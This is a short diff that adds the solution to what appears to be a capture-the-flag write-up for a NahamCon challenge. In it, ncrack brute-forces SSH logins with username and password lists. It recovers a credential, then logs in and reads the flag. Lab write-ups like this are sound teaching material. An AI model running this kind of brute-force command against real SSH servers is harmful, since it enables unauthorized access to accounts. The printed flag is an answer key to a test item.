@@ -23,5 +23,17 @@ Tags: _ncrack_
 
 ## Solving
 
+```
+$ ncrack -U mission-usr.lst -P mission-password.lst ssh://challenge.nahamcon.com:32317
+
+Discovered credential on ssh://35.239.227.150:32317 'pavo' 'starsinthesky'
+```
+
+```
+$ ssh pavo@challenge.nahamcon.com -p 32317
+
+cat flag.txt
+flag{cadbbfd75d2547700221f8c2588e026e}
+```
 
 `flag{cadbbfd75d2547700221f8c2588e026e}`
